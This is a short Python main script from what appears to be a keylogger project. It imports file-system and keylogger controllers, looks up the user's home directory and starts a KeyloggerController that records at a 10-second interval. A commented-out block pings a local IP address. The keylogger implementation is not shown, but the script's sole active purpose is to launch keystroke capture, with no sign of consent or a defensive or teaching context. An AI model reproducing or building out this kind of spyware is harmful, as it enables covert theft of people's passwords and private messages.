#!/usr/bin/env python3

from controller.FileSystemController import FileSystemController
from controller.KeyloggerController import KeyloggerController

import os

if __name__ == "__main__":
    fs_controller = FileSystemController()
    ruta_home_usuario = fs_controller.get_home()

    # Iniciamos el Keylogger [OK]
    keylogger = KeyloggerController(interval=10)
    keylogger.start()


 
    # hostname = "192.168.1.220" #example
    # comando_ping_para_windows = "ping -n 1 " + hostname
    # comando_ping_para_linux   = "ping -c 1 " + hostname

    # response = os.system(comando_ping_para_linux)

    # #and then check the response...
    # if response == 0:
    #     print(hostname, 'is up!')
    # else:
    #     print(hostname, 'is down!')